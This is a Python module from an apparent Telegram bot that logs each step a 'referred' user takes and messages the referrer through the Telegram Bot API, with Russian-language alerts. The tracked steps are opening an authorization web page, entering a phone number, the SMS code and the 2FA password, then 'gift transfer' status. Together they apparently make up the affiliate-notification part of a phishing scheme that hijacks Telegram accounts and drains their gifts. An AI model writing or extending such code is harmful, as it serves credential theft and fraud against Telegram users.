"""
Utility functions for referral link action logging.
"""
from typing import Optional
from server.bot.store.referral_links import get_referral_link_by_user, add_referral_action, get_referral_by_link
import os
import sys
import requests

# Ensure repo root is on sys.path
REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "../.."))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)


def send_referrer_notification(referrer_id: int, user_id: int, user_username: Optional[str], action_type: str, details: Optional[str] = None):
    """
    Sends a notification to the referrer about their referral's action using Telegram Bot API.
    
    Args:
        referrer_id: Telegram ID of the referrer
        user_id: Telegram ID of the user who performed the action
        user_username: Username of the user (if available)
        action_type: Type of action performed
        details: Additional details (optional)
    """
    print(f"[REFERRAL] send_referrer_notification called: referrer_id={referrer_id}, user_id={user_id}, action={action_type}")
    try:
        from server.bot.get_bot_token import get_bot_token
        
        # Format user display name
        user_display = f"@{user_username}" if user_username else f"ID: {user_id}"
        
        # Create message based on action type
        action_messages = {
            "bot_visit": f"🔔 Новый переход по вашей реферальной ссылке!\n\n👤 Пользователь: {user_display}\n📍 Действие: Зашел в бота",
            "webapp_open": f"🌐 Пользователь открыл веб-приложение\n\n👤 Пользователь: {user_display}\n📍 Действие: Открыл страницу авторизации",
            "phone_entered": f"📱 Пользователь ввел номер телефона\n\n👤 Пользователь: {user_display}\n📍 Действие: Ввел номер телефона",
            "code_entered": f"✉️ Пользователь ввел код из SMS\n\n👤 Пользователь: {user_display}\n📍 Действие: Ввел код подтверждения",
            "2fa_entered": f"🔐 Пользователь ввел 2FA пароль\n\n👤 Пользователь: {user_display}\n📍 Действие: Ввел двухфакторный пароль",
            "gift_transfer": f"🎁 Статус передачи подарков\n\n👤 Пользователь: {user_display}\n📍 Статус: {details if details else 'Выполняется'}"
        }
        
        message = action_messages.get(action_type, f"ℹ️ Новое действие\n\n👤 Пользователь: {user_display}\n📍 Действие: {action_type}")
        
        # Add details if provided and not gift_transfer (already included)
        if details and action_type != "gift_transfer":
            message += f"\n💬 Детали: {details}"
        
        bot_token = get_bot_token()
        
        if not bot_token:
            print(f"[REFERRAL] [ERROR] Bot token not found for sending notification")
            return
        
        # Send notification via Telegram Bot API (simple HTTP request)
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            "chat_id": referrer_id,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f"[REFERRAL] [OK] Notification sent to referrer {referrer_id} about {action_type}")
        else:
            print(f"[REFERRAL] [ERROR] Failed to send notification: {response.status_code} {response.text}")
    except Exception as e:
        print(f"[REFERRAL] [ERROR] Exception in send_referrer_notification: {str(e)}")
        import traceback
        print(f"[REFERRAL] [ERROR] Traceback: {traceback.format_exc()}")


def log_referral_action(user_id: Optional[int], action_type: str, details: Optional[str] = None):
    """
    Logs an action for a user if they came from a referral link.
    Also sends notification to the referrer.
    
    Args:
        user_id: Telegram user ID (can be None if not available)
        action_type: Type of action ("bot_visit", "webapp_open", "phone_entered", "code_entered", "2fa_entered", "gift_transfer")
        details: Additional details about the action
    """
    if not user_id:
        return
    
    try:
        referral_link = get_referral_link_by_user(user_id)
        if referral_link:
            # Log the action to database
            add_referral_action(
                referral_link=referral_link,
                user_id=user_id,
                action_type=action_type,
                details=details
            )
            
            # Get referral data to find referrer ID
            ref_data = get_referral_by_link(referral_link)
            if ref_data:
                # Get user username from clicks
                user_username = None
                for click in ref_data.clicks:
                    if click.user_id == user_id:
                        user_username = click.username
                        break
                
                # Send notification to referrer
                send_referrer_notification(
                    referrer_id=ref_data.user_id,
                    user_id=user_id,
                    user_username=user_username,
                    action_type=action_type,
                    details=details
                )
    except Exception as e:
        # Don't break the flow if logging fails
        print(f"[REFERRAL] [ERROR] Failed to log action: {str(e)}")




